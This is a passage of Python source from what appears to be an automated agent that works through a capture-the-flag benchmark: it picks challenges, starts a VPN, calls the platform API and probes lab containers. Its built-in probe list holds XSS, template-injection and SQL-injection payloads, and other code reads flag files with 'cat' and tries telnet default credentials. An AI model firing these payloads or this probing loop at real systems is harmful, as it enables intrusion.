                        and str(target_item.get("difficulty") or "").lower()
                        in set(self._benchmark_selection_policy()["difficulty_order"])
                        and self._benchmark_is_startable_status(target_item)
                    ):
                        difficulty = str(target_item.get("difficulty") or "unknown").lower()
                        return (
                            f"{code} 是未启动、未完成的 stopped {difficulty}，禁止直接 close；"
                            "只能 close 当前 active/stale 题，或先 start 后探测。"
                        )

        active_host_ports: dict[str, set[str]] = {}
        for addrs in active.values():
            for addr in addrs or []:
                if not isinstance(addr, str) or not addr:
                    continue
                match = _re_mod.fullmatch(
                    r"(10\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})",
                    addr,
                )
                if match:
                    active_host_ports.setdefault(match.group(1), set()).add(match.group(2))
        for host, raw_port in _re_mod.findall(
            r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::(\d{1,5}))?",
            command,
        ):
            allowed_ports = active_host_ports.get(host)
            if not allowed_ports:
                continue
            port = raw_port
            if not port and _re_mod.search(rf"https?://{_re_mod.escape(host)}(?:[/?#\s]|$)", command):
                port = "80"
            if port and port not in allowed_ports:
                allowed = ", ".join(f"{host}:{p}" for p in sorted(allowed_ports))
                return (
                    f"当前活跃容器已记录精确地址 {allowed}，禁止猜测探测 "
                    f"{host}:{port}；请使用 state 中的完整 host:port。"
                )

        for code, addrs in active.items():
            if code in completed or code in closed or code in abandoned:
                for addr in addrs or []:
                    if isinstance(addr, str) and addr and addr in command:
                        if code in abandoned:
                            return (
                                f"{code} 已被 Benchmark stale detector 判定为低收益题，"
                                "禁止继续探测该容器；下一步必须 close 当前题并切换下一道未完成题。"
                            )
                        return (
                            f"{code} 的容器地址 {addr} 已不应继续探测；"
                            "请切换到当前活跃题或获取最新题目列表。"
                        )

        return None

    def _benchmark_api_config_from_workspace(self) -> tuple[str, str] | None:
        """Read Benchmark API base URL and token from the current benchmark workspace."""
        workdir = Path("/home/my/cyber/benchmark_test")
        doc = workdir / "CHALLENGES_API.md"
        try:
            text = doc.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return None
        base_match = _re_mod.search(
            r"^BENCHMARK_BASE_URL为[:：]?\s*(\S+)\s*$",
            text,
            _re_mod.MULTILINE,
        )
        token_match = _re_mod.search(
            r"^BENCHMARK_TOKEN为[:：]?\s*([0-9a-fA-F-]+)\s*$",
            text,
            _re_mod.MULTILINE,
        )
        if not base_match or not token_match:
            return None
        return base_match.group(1).rstrip("/"), token_match.group(1)

    def _benchmark_api_interface(self) -> str:
        with self._benchmark_state_lock:
            interface = self._benchmark_state.get("api_interface")
        return str(interface or "enp0s20f0u3u4")

    def _benchmark_tun_interface(self) -> str:
        with self._benchmark_state_lock:
            interface = self._benchmark_state.get("tun_interface")
        return str(interface or "tun0")

    @staticmethod
    def _benchmark_result_head(result: str, *, limit: int = 180) -> str:
        heads: list[str] = []
        for line in str(result or "").splitlines():
            cleaned = " ".join(line.strip().split())
            if cleaned:
                heads.append(cleaned)
            if len(heads) >= 2:
                break
        if heads:
            return " | ".join(heads)[:limit]
        return ""

    @staticmethod
    def _benchmark_workspace_path() -> Path:
        return Path("/home/my/cyber/benchmark_test")

    def _benchmark_external_profiles_path(self) -> Path:
        raw_path = self._runtime_context.get("benchmark_profiles_path")
        if raw_path:
            return Path(str(raw_path)).expanduser()
        return self._benchmark_workspace_path() / "benchmark-profiles.json"

    def _benchmark_external_profiles(self) -> dict[str, Any]:
        path = self._benchmark_external_profiles_path()
        try:
            data = json.loads(path.read_text(encoding="utf-8", errors="replace"))
        except (OSError, json.JSONDecodeError, TypeError, ValueError):
            return {}
        return data if isinstance(data, dict) else {}

    def _benchmark_selection_policy(self) -> dict[str, Any]:
        data = self._benchmark_external_profiles()
        raw_policy = data.get("selection_policy", data.get("scheduling_policy", {}))
        if not isinstance(raw_policy, dict):
            raw_policy = {}

        def difficulty_list(key: str, default: tuple[str, ...]) -> tuple[str, ...]:
            configured = self._benchmark_string_tuple(raw_policy.get(key), limit=10)
            normalized = tuple(
                item.lower()
                for item in configured
                if item.lower() in {"easy", "medium", "hard"}
            )
            return normalized or default

        def positive_int(key: str, default: int, *, low: int = 1, high: int = 20) -> int:
            try:
                value = int(raw_policy.get(key))
            except (TypeError, ValueError):
                return default
            return min(high, max(low, value))

        return {
            "difficulty_order": difficulty_list(
                "difficulty_order",
                ("easy", "medium", "hard"),
            ),
            "fast_path_difficulties": difficulty_list(
                "fast_path_difficulties",
                ("easy",),
            ),
            "handoff_difficulties": difficulty_list(
                "handoff_difficulties",
                ("medium", "hard"),
            ),
            "recovery_difficulties": difficulty_list(
                "recovery_difficulties",
                ("easy",),
            ),
            "unreachable_retries": positive_int("unreachable_retries", 2, high=10),
            "estimated_fast_score": positive_int(
                "estimated_fast_score",
                200,
                high=1000,
            ),
        }

    def _benchmark_difficulty_rank(self, difficulty: Any) -> int:
        normalized = str(difficulty or "").lower()
        order = list(self._benchmark_selection_policy()["difficulty_order"])
        try:
            return order.index(normalized)
        except ValueError:
            return len(order) + 1

    def _benchmark_fast_path_difficulties(self) -> set[str]:
        return set(self._benchmark_selection_policy()["fast_path_difficulties"])

    def _benchmark_recovery_difficulties(self) -> set[str]:
        return set(self._benchmark_selection_policy()["recovery_difficulties"])

    def _benchmark_handoff_difficulties(self) -> set[str]:
        return set(self._benchmark_selection_policy()["handoff_difficulties"])

    def _benchmark_unreachable_retry_limit(self) -> int:
        return int(self._benchmark_selection_policy()["unreachable_retries"])

    def _benchmark_estimated_fast_score(self) -> int:
        return int(self._benchmark_selection_policy()["estimated_fast_score"])

    def _benchmark_policy_difficulty_label(self, key: str) -> str:
        values = self._benchmark_selection_policy().get(key)
        if not isinstance(values, tuple):
            return "未配置"
        return "/".join(values) if values else "未配置"

    def _benchmark_selection_order_label(self) -> str:
        return " > ".join(self._benchmark_selection_policy()["difficulty_order"])

    @staticmethod
    def _benchmark_string_tuple(value: Any, *, limit: int = 80) -> tuple[str, ...]:
        if isinstance(value, str):
            items: list[Any] = [value]
        elif isinstance(value, (list, tuple)):
            items = list(value)
        else:
            return ()
        result: list[str] = []
        for item in items[:limit]:
            if not isinstance(item, str):
                continue
            cleaned = item.strip()
            if cleaned:
                result.append(cleaned)
        return tuple(dict.fromkeys(result))

    @staticmethod
    def _benchmark_string_pair_tuple(
        value: Any,
        *,
        limit: int = 20,
    ) -> tuple[tuple[str, str], ...]:
        if not isinstance(value, (list, tuple)):
            return ()
        pairs: list[tuple[str, str]] = []
        for item in list(value)[:limit]:
            username = password = ""
            if isinstance(item, (list, tuple)) and len(item) >= 2:
                username, password = str(item[0]).strip(), str(item[1]).strip()
            elif isinstance(item, dict):
                username = str(item.get("username") or item.get("user") or "").strip()
                password = str(item.get("password") or item.get("pass") or "").strip()
            if username and password:
                pairs.append((username, password))
        return tuple(dict.fromkeys(pairs))

    @staticmethod
    def _benchmark_match_any_all_tuple(value: Any) -> tuple[tuple[str, ...], ...]:
        if not isinstance(value, (list, tuple)):
            return ()
        groups: list[tuple[str, ...]] = []
        for group in list(value)[:40]:
            normalized = FourPillarPipeline._benchmark_string_tuple(group, limit=20)
            if normalized:
                groups.append(normalized)
        return tuple(groups)

    @staticmethod
    def _benchmark_merge_profiles_by_key(
        builtin: list[dict[str, Any]],
        external: list[dict[str, Any]],
        key: str,
    ) -> list[dict[str, Any]]:
        def merge_value(existing: Any, incoming: Any) -> Any:
            if (
                isinstance(existing, (tuple, list))
                and isinstance(incoming, (tuple, list))
                and not isinstance(existing, (str, bytes))
                and not isinstance(incoming, (str, bytes))
            ):
                merged_items: list[Any] = []
                seen_items: set[str] = set()
                for item in tuple(existing) + tuple(incoming):
                    key_text = json.dumps(
                        item,
                        ensure_ascii=False,
                        sort_keys=True,
                        default=str,
                    )
                    if key_text in seen_items:
                        continue
                    seen_items.add(key_text)
                    merged_items.append(item)
                return tuple(merged_items)
            return incoming

        result = [dict(profile) for profile in builtin]
        index = {
            str(profile.get(key)): offset
            for offset, profile in enumerate(result)
            if profile.get(key)
        }
        for profile in external:
            profile_key = str(profile.get(key) or "")
            if not profile_key:
                continue
            if profile_key in index:
                merged = dict(result[index[profile_key]])
                for profile_field, profile_value in profile.items():
                    if profile_field == key:
                        merged[profile_field] = profile_value
                    else:
                        merged[profile_field] = merge_value(
                            merged.get(profile_field),
                            profile_value,
                        )
                result[index[profile_key]] = merged
            else:
                index[profile_key] = len(result)
                result.append(dict(profile))
        return result

    def _benchmark_platform_request(
        self,
        *,
        method: str,
        path: str,
        body: dict[str, Any] | None = None,
        timeout: int = 30,
    ) -> tuple[int, str, str]:
        api_config = self._benchmark_api_config_from_workspace()
        if api_config is None:
            raise RuntimeError("无法从 CHALLENGES_API.md 读取 Benchmark API 配置")
        base_url, token = api_config
        api_interface = self._benchmark_api_interface()
        url = f"{base_url}{path}"
        cmd = [
            "curl",
            "-sS",
            "--interface",
            api_interface,
            "--connect-timeout",
            "10",
            "--max-time",
            str(timeout),
            "-X",
            method.upper(),
            url,
            "-H",
            f"BENCHMARK_TOKEN: {token}",
        ]
        if body is not None:
            cmd.extend([
                "-H",
                "Content-Type: application/json",
                "-d",
                json.dumps(body, ensure_ascii=False, separators=(",", ":")),
            ])
        result = subprocess.run(
            cmd,
            check=False,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=timeout + 5,
        )
        command_text = " ".join(cmd)
        synthetic_content = (
            f"命令: {command_text}\n"
            "工作目录: /home/my/cyber/benchmark_test\n"
            f"退出码: {result.returncode}\n"
            "输出:\n"
            f"{result.stdout}"
        )
        if result.stderr:
            synthetic_content += f"\n错误输出:\n{result.stderr}"
        self._update_benchmark_runtime_state(synthetic_content)
        return result.returncode, result.stdout, result.stderr

    def _benchmark_detect_tun_local(self) -> tuple[str, str] | None:
        try:
            result = subprocess.run(
                ["ip", "-o", "-4", "addr", "show"],
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=5,
            )
        except Exception:
            return None
        for line in (result.stdout or "").splitlines():
            match = _re_mod.search(r"\b(tun\d+)\b.*\binet\s+([0-9.]+)/\d+", line)
            if not match:
                continue
            tun, ip_addr = match.group(1), match.group(2)
            with self._benchmark_state_lock:
                self._benchmark_state["vpn_connected"] = True
                self._benchmark_state["tun_interface"] = tun
                self._benchmark_state["tun_ip"] = ip_addr
            self._persist_benchmark_state()
            return tun, ip_addr
        return None

    def _benchmark_start_vpn_local(self) -> str:
        workdir = Path("/home/my/cyber/benchmark_test")
        configs = sorted(workdir.glob("*.ovpn"))
        if not configs:
            return "未找到 .ovpn 配置，无法启动 VPN。"
        config = configs[0]
        log_path = Path("/tmp/openvpn.log")
        cmd = [
            "sudo",
            "openvpn",
            "--config",
            str(config),
            "--daemon",
            "--log",
            str(log_path),
        ]
        try:
            result = subprocess.run(
                cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=15,
            )
        except Exception as exc:
            return f"启动 VPN 异常: {exc}"
        with self._benchmark_state_lock:
            self._benchmark_state["vpn_config"] = str(config)
        self._persist_benchmark_state()
        time_mod.sleep(2)
        detected = self._benchmark_detect_tun_local()
        note = f"stdout={result.stdout[:200]} stderr={result.stderr[:300]}"
        if detected:
            return f"已启动 VPN 并检测到 {detected[0]} {detected[1]}。{note}"
        return f"VPN 启动命令已执行但尚未检测到 tun。{note}"

    def _benchmark_list_challenges_local(self) -> list[dict[str, Any]]:
        code, stdout, stderr = self._benchmark_platform_request(
            method="GET",
            path="/openapi/v1/challenges",
        )
        if code != 0:
            raise RuntimeError(stderr.strip() or f"curl 退出码 {code}")
        data = json.loads(stdout)
        if isinstance(data, dict) and data.get("code") == "invalid_state":
            return []
        if not isinstance(data, list):
            raise RuntimeError(f"题目列表响应不是数组: {stdout[:200]}")
        return [dict(item) for item in data if isinstance(item, dict)]

    def _benchmark_candidate_rank(self, item: dict[str, Any]) -> tuple[int, int, int, str]:
        difficulty = str(item.get("difficulty") or "").lower()
        difficulty_rank = self._benchmark_difficulty_rank(difficulty)
        return (
            difficulty_rank,
            int(item.get("level") or 999),
            -int(item.get("total_score") or 0),
            str(item.get("unique_code") or ""),
        )

    @staticmethod
    def _benchmark_container_status(item: dict[str, Any]) -> str:
        status = item.get("container_status")
        return str(status or "").strip().lower()

    @classmethod
    def _benchmark_is_active_status(cls, item: dict[str, Any]) -> bool:
        status = cls._benchmark_container_status(item)
        addrs = item.get("container_addr")
        has_addrs = isinstance(addrs, list) and bool(addrs)
        if status in {
            "available",
            "active",
            "running",
            "started",
            "up",
            "healthy",
        }:
            return True
        if status == "ready" and has_addrs:
            return True
        if not status:
            return has_addrs
        return False

    @classmethod
    def _benchmark_is_startable_status(cls, item: dict[str, Any]) -> bool:
        status = cls._benchmark_container_status(item)
        if status in {
            "",
            "stopped",
            "stop",
            "closed",
            "ready",
            "pending",
            "created",
            "not_started",
            "not-started",
            "unstarted",
        }:
            return True
        if cls._benchmark_is_active_status(item):
            return False
        return bool(status.endswith("stopped") or status.endswith("_stopped"))

    def _benchmark_select_next_candidate(
        self,
        challenges: list[dict[str, Any]],
    ) -> dict[str, Any] | None:
        """Select the next Benchmark challenge without locking formal eval to easy only."""
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            recovered = set(
                self._benchmark_state.get("recovery_attempted_challenges", set())
            )
        excluded = completed | closed | abandoned
        candidates: list[dict[str, Any]] = []
        recovery_candidates: list[dict[str, Any]] = []
        for item in challenges:
            code = item.get("unique_code")
            if not isinstance(code, str) or code in completed:
                continue
            if item.get("is_completed") is True:
                continue
            difficulty = str(item.get("difficulty") or "").lower()
            if difficulty not in {"easy", "medium", "hard"}:
                continue
            if not self._benchmark_is_startable_status(item):
                continue
            if code in (closed | abandoned) and code not in recovered:
                recovery_candidates.append(item)
            elif code in excluded:
                continue
            else:
                candidates.append(item)
        candidates.sort(key=self._benchmark_candidate_rank)
        recovery_candidates.sort(key=self._benchmark_candidate_rank)
        recoverable_difficulties = self._benchmark_recovery_difficulties()
        priority_recovery = [
            item for item in recovery_candidates
            if str(item.get("difficulty") or "").lower() in recoverable_difficulties
        ]
        if candidates:
            best_candidate = candidates[0]
            if priority_recovery:
                best_recovery = priority_recovery[0]
                if self._benchmark_candidate_rank(best_recovery) < self._benchmark_candidate_rank(best_candidate):
                    code = best_recovery.get("unique_code")
                    if isinstance(code, str):
                        with self._benchmark_state_lock:
                            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                            closed = set(self._benchmark_state.get("closed_challenges", set()))
                            recovered = set(
                                self._benchmark_state.get("recovery_attempted_challenges", set())
                            )
                            abandoned.discard(code)
                            closed.discard(code)
                            recovered.add(code)
                            self._benchmark_state["abandoned_challenges"] = abandoned
                            self._benchmark_state["closed_challenges"] = closed
                            self._benchmark_state["recovery_attempted_challenges"] = recovered
                    return best_recovery
            return best_candidate
        if priority_recovery:
            code = priority_recovery[0].get("unique_code")
            if isinstance(code, str):
                with self._benchmark_state_lock:
                    abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                    closed = set(self._benchmark_state.get("closed_challenges", set()))
                    recovered = set(
                        self._benchmark_state.get("recovery_attempted_challenges", set())
                    )
                    abandoned.discard(code)
                    closed.discard(code)
                    recovered.add(code)
                    self._benchmark_state["abandoned_challenges"] = abandoned
                    self._benchmark_state["closed_challenges"] = closed
                    self._benchmark_state["recovery_attempted_challenges"] = recovered
            return priority_recovery[0]
        if recovery_candidates:
            code = recovery_candidates[0].get("unique_code")
            if isinstance(code, str):
                with self._benchmark_state_lock:
                    abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                    closed = set(self._benchmark_state.get("closed_challenges", set()))
                    recovered = set(
                        self._benchmark_state.get("recovery_attempted_challenges", set())
                    )
                    abandoned.discard(code)
                    closed.discard(code)
                    recovered.add(code)
                    self._benchmark_state["abandoned_challenges"] = abandoned
                    self._benchmark_state["closed_challenges"] = closed
                    self._benchmark_state["recovery_attempted_challenges"] = recovered
            return recovery_candidates[0]
        return None

    def _benchmark_select_next_easy(
        self,
        challenges: list[dict[str, Any]],
    ) -> dict[str, Any] | None:
        """Backward-compatible easy-only selector used by legacy tests and recovery."""
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            recovered = set(
                self._benchmark_state.get("recovery_attempted_challenges", set())
            )
        excluded = completed | closed | abandoned
        candidates: list[dict[str, Any]] = []
        recovery_candidates: list[dict[str, Any]] = []
        for item in challenges:
            code = item.get("unique_code")
            if not isinstance(code, str) or code in completed:
                continue
            if item.get("is_completed") is True:
                continue
            if str(item.get("difficulty") or "").lower() != "easy":
                continue
            if not self._benchmark_is_startable_status(item):
                continue
            if code in (closed | abandoned) and code not in recovered:
                recovery_candidates.append(item)
            elif code in excluded:
                continue
            else:
                candidates.append(item)
        candidates.sort(key=self._benchmark_candidate_rank)
        if candidates:
            return candidates[0]
        has_untried_non_easy = any(
            isinstance(item, dict)
            and isinstance(item.get("unique_code"), str)
            and item.get("unique_code") not in excluded
            and item.get("is_completed") is not True
            and str(item.get("difficulty") or "").lower() in {"medium", "hard"}
            and (
                self._benchmark_is_startable_status(item)
                or self._benchmark_is_active_status(item)
            )
            for item in challenges
        )
        if has_untried_non_easy:
            return None
        recovery_candidates.sort(key=self._benchmark_candidate_rank)
        if recovery_candidates:
            code = recovery_candidates[0].get("unique_code")
            if isinstance(code, str):
                with self._benchmark_state_lock:
                    abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                    closed = set(self._benchmark_state.get("closed_challenges", set()))
                    recovered = set(
                        self._benchmark_state.get("recovery_attempted_challenges", set())
                    )
                    abandoned.discard(code)
                    closed.discard(code)
                    recovered.add(code)
                    self._benchmark_state["abandoned_challenges"] = abandoned
                    self._benchmark_state["closed_challenges"] = closed
                    self._benchmark_state["recovery_attempted_challenges"] = recovered
            return recovery_candidates[0]
        return None


    def _benchmark_mark_abandoned(self, code: str, reason: str) -> None:
        if not code:
            return
        with self._benchmark_state_lock:
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            abandoned.add(code)
            self._benchmark_state["abandoned_challenges"] = abandoned
        self._record_trace(
            "benchmark_challenge_abandoned",
            detail=f"{code} 已加入本轮跳过列表：{reason}",
            metadata={"challenge": code, "reason": reason},
        )
        self._persist_benchmark_state()

    def _benchmark_mark_reasoning_needed(self, code: str, reason: str) -> None:
        if not code:
            return
        with self._benchmark_state_lock:
            reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
            reasoning.add(code)
            self._benchmark_state["reasoning_challenges"] = reasoning
            streaks = dict(self._benchmark_state.get("probe_unreachable_streaks", {}))
            streaks.pop(code, None)
            self._benchmark_state["probe_unreachable_streaks"] = streaks
        self._record_trace(
            "benchmark_challenge_needs_reasoning",
            detail=f"{code} 已保留 active 并切回推理管线：{reason}",
            metadata={"challenge": code, "reason": reason},
        )
        self._persist_benchmark_state()

    def _benchmark_set_service_fingerprint(self, code: str, fingerprint: str) -> None:
        if not code or not fingerprint:
            return
        with self._benchmark_state_lock:
            fingerprints = dict(self._benchmark_state.get("service_fingerprints", {}))
            fingerprints[code] = fingerprint
            self._benchmark_state["service_fingerprints"] = fingerprints
        self._record_trace(
            "benchmark_service_fingerprint",
            detail=f"{code} 服务指纹：{fingerprint}",
            metadata={"challenge": code, "fingerprint": fingerprint},
        )
        self._persist_benchmark_state()

    def _benchmark_note_probe_unreachable(self, code: str) -> int:
        if not code:
            return 0
        with self._benchmark_state_lock:
            streaks = dict(self._benchmark_state.get("probe_unreachable_streaks", {}))
            streak = int(streaks.get(code) or 0) + 1
            streaks[code] = streak
            self._benchmark_state["probe_unreachable_streaks"] = streaks
        self._persist_benchmark_state()
        return streak

    def _benchmark_clear_probe_unreachable(self, code: str) -> None:
        if not code:
            return
        with self._benchmark_state_lock:
            streaks = dict(self._benchmark_state.get("probe_unreachable_streaks", {}))
            if code not in streaks:
                return
            streaks.pop(code, None)
            self._benchmark_state["probe_unreachable_streaks"] = streaks
        self._persist_benchmark_state()

    @staticmethod
    def _benchmark_probe_has_reachable_signal(probe: str) -> bool:
        lowered = probe.lower()
        reachable_markers = (
            "http/1.0 ",
            "http/1.1 ",
            "http/2 ",
            "server:",
            "content-type:",
            "location:",
            "<html",
            "<body",
            "<script",
            "<form",
            "_next/static",
            "x-powered-by:",
            "set-cookie:",
            "api/",
            "/api/",
            "swagger",
            "openapi",
            "docs",
            "hugegraph",
            '"service":"',
            "flag{",
        )
        return any(marker in lowered for marker in reachable_markers)

    @staticmethod
    def _benchmark_probe_looks_unreachable(probe: str) -> bool:
        lowered = probe.lower()
        if FourPillarPipeline._benchmark_probe_has_reachable_signal(probe):
            return False
        unreachable_markers = (
            "failed to connect",
            "could not connect to server",
            "connection refused",
            "connection timed out",
            "no route to host",
            "network is unreachable",
            "operation timed out",
            "empty reply from server",
        )
        return any(marker in lowered for marker in unreachable_markers)

    def _benchmark_active_challenge_from_state(self) -> tuple[str | None, list[str]]:
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            current = self._benchmark_state.get("current_challenge")
            active = dict(self._benchmark_state.get("active_containers", {}))
        excluded = completed | closed
        if isinstance(current, str) and current and current in active and current not in excluded:
            return current, [str(addr) for addr in active.get(current) or []]
        for code, addrs in sorted(active.items()):
            if isinstance(code, str) and code not in excluded:
                return code, [str(addr) for addr in addrs or []]
        return None, []

    def _benchmark_refresh_active_challenge_from_platform(self) -> tuple[str | None, list[str]]:
        try:
            challenges = self._benchmark_list_challenges_local()
        except Exception:
            return None, []
        active_items = [
            item for item in challenges
            if self._benchmark_is_active_status(item)
            and item.get("is_completed") is not True
        ]
        if not active_items:
            return None, []
        item = active_items[0]
        code = item.get("unique_code")
        addrs = item.get("container_addr") or []
        if not isinstance(code, str) or not code:
            return None, []
        return code, [str(addr) for addr in addrs or []]

    def _benchmark_close_local(self, code: str) -> str:
        _, stdout, _ = self._benchmark_platform_request(
            method="POST",
            path=f"/openapi/v1/challenges/close?unique_code={code}",
        )
        return stdout

    def _benchmark_start_local(self, code: str) -> str:
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
            closed = set(self._benchmark_state.get("closed_challenges", set()))
            abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
            active = dict(self._benchmark_state.get("active_containers", {}))
        active_open = {
            active_code: addrs
            for active_code, addrs in active.items()
            if active_code not in completed
            and active_code not in closed
            and active_code not in abandoned
        }
        if active_open:
            active_text = ", ".join(
                f"{active_code}=>{','.join(str(addr) for addr in addrs or [])}"
                for active_code, addrs in sorted(active_open.items())
            )
            return (
                f"blocked_by_active: 当前已有 active 容器 {active_text}，"
                f"拒绝 start {code}；必须先 probe/submit/close 当前题。"
            )
        _, stdout, _ = self._benchmark_platform_request(
            method="POST",
            path=f"/openapi/v1/challenges/start?unique_code={code}",
        )
        try:
            value = json.loads(stdout)
        except Exception:
            value = None
        if isinstance(value, dict):
            addrs = value.get("container_addr")
            if isinstance(addrs, list) and addrs:
                with self._benchmark_state_lock:
                    active = dict(self._benchmark_state.get("active_containers", {}))
                    closed = set(self._benchmark_state.get("closed_challenges", set()))
                    abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
                    active[code] = [str(addr) for addr in addrs]
                    closed.discard(code)
                    abandoned.discard(code)
                    self._benchmark_state["active_containers"] = active
                    self._benchmark_state["current_challenge"] = code
                    self._benchmark_state["closed_challenges"] = closed
                    self._benchmark_state["abandoned_challenges"] = abandoned
                    self._benchmark_current_challenge = code
                self._persist_benchmark_state()
        lowered = stdout.lower()
        if (
            "resource_unavailable" in lowered
            or "resource_agent" in lowered
            or "http 502" in lowered
        ):
            self._benchmark_mark_abandoned(code, "start 返回资源不可用")
        return stdout

    def _benchmark_close_completed_active_from_snapshot(
        self,
        challenges: list[dict[str, Any]],
    ) -> list[str]:
        """Close completed containers that still consume active slots."""
        with self._benchmark_state_lock:
            closed = set(self._benchmark_state.get("closed_challenges", set()))
        results: list[str] = []
        seen: set[str] = set()
        for item in challenges:
            code = item.get("unique_code")
            if (
                not isinstance(code, str)
                or code in closed
                or code in seen
                or item.get("is_completed") is not True
                or not self._benchmark_is_active_status(item)
            ):
                continue
            seen.add(code)
            closed_result = self._benchmark_close_local(code)
            results.append(f"{code}: {closed_result[:160]}")
        return results

    def _benchmark_probe_container_local(self, code: str, addrs: list[str]) -> str:
        if not addrs:
            return "无容器地址，无法探测。"
        addr = addrs[0]
        if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
            return f"容器地址格式异常: {addr}"
        _, port = addr.rsplit(":", 1)
        base_urls = [f"http://{addr}/"]
        if port in {"443", "8443"}:
            base_urls = [f"https://{addr}/", f"http://{addr}/"]
        base = base_urls[0]
        if port in {"23", "2323"}:
            self._benchmark_set_service_fingerprint(code, "telnet")
            telnet_output = self._benchmark_probe_telnet_login_local(code, addr)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code not in completed:
                self._benchmark_mark_abandoned(
                    code,
                    "Telnet bounded 默认凭据/flag 路径探测未发现可提交 flag",
                )
            return telnet_output
        urls = [
            f"{base_url}{path}"
            for base_url in base_urls
            for path in self._benchmark_probe_paths()
        ]
        outputs: list[str] = []
        root_body = self._benchmark_wait_for_container_ready(base, outputs)
        urls.extend(self._benchmark_derive_probe_urls(base, root_body))
        tun_interface = self._benchmark_tun_interface()
        seen_urls: set[str] = set()
        queue: list[str] = []
        for url in urls:
            if url in seen_urls:
                continue
            seen_urls.add(url)
            queue.append(url)
        max_probe_urls = 60
        index = 0
        while index < len(queue) and index < max_probe_urls:
            url = queue[index]
            index += 1
            cmd = [
                "curl",
                "-sS",
                "-k",
                "--interface",
                tun_interface,
                "--connect-timeout",
                "2",
                "--max-time",
                "4",
                "--globoff",
                "-i",
                url,
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=6,
                )
            except Exception as exc:
                outputs.append(f"## {url}\nERROR: {exc}")
                continue
            body = (result.stdout or "")[:4000]
            err = (result.stderr or "")[:1000]
            outputs.append(f"## {url}\n{body}\n{err}")
            synthetic_content = (
                f"命令: {' '.join(cmd)}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(synthetic_content)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
            for derived in self._benchmark_derive_probe_urls(base, body):
                if derived in seen_urls:
                    continue
                seen_urls.add(derived)
                queue.append(derived)
        joined_outputs = "\n".join(outputs)
        service_matched, service_outputs = self._benchmark_probe_matching_service_local(
            code,
            base,
            joined_outputs,
        )
        if service_matched:
            outputs.extend(service_outputs)
            return "\n".join(outputs)
        webapp_output = self._benchmark_probe_common_webapp_flows(code, base, joined_outputs)
        if webapp_output:
            outputs.append(webapp_output)
            joined_outputs = "\n".join(outputs)
        if self._benchmark_probe_suggests_raw_text_protocol(joined_outputs):
            raw_output = self._benchmark_probe_raw_text_protocol(code, addr)
            if raw_output:
                outputs.append(raw_output)
        return "\n".join(outputs)

    @staticmethod
    def _benchmark_builtin_probe_paths() -> list[str]:
        return [
            "",
            "robots.txt",
            "sitemap.xml",
            "openapi.json",
            "docs",
            "login.php",
            "dashboard.php",
            "download.php",
            "upload.php",
            "flag",
            "flag.txt",
            "admin",
            "api/flag",
            ".git/config",
            "backup.zip",
            "page?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
            "?name=x%22;alert(%22XSS%22)%3Bfoo=%22",
            "?name={{{{7*7}}}}",
            "page?name={{{{7*7}}}}",
            "search?q=%27%20OR%20%271%27%3D%271",
            "?id=1%20OR%201=1",
            "user?id=1",
            "api/user?id=1",
        ]

    def _benchmark_probe_paths(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("probe_paths"), limit=160)
        return list(dict.fromkeys(self._benchmark_builtin_probe_paths() + list(external)))

    @staticmethod
    def _benchmark_builtin_flag_paths() -> tuple[str, ...]:
        return (
            "/challenge/flag.txt",
            "/challenge/flag",
            "/flag",
            "/flag.txt",
            "/root/flag",
            "/root/flag.txt",
            "/tmp/flag",
            "/tmp/flag.txt",
            "/home/flag",
            "/home/flag.txt",
            "/run/secrets/flag",
            "/hugegraph-server/flag",
            "/hugegraph-server/flag.txt",
        )

    @staticmethod
    def _benchmark_is_safe_flag_path(path: str) -> bool:
        return bool(_re_mod.fullmatch(r"/[A-Za-z0-9._/\-{}]{1,220}", path))

    def _benchmark_flag_paths(self, *, limit: int = 40) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("flag_paths"), limit=80)
        paths: list[str] = []
        for raw_path in self._benchmark_builtin_flag_paths() + external:
            path = str(raw_path or "").strip()
            if not path:
                continue
            if not path.startswith("/"):
                path = f"/{path}"
            if not self._benchmark_is_safe_flag_path(path):
                continue
            paths.append(path)
        return tuple(dict.fromkeys(paths))[: max(1, min(limit, 80))]

    def _benchmark_flag_cat_command(self, *, limit: int = 10) -> str:
        paths = self._benchmark_flag_paths(limit=limit)
        return f"cat {' '.join(paths)} 2>/dev/null\n"

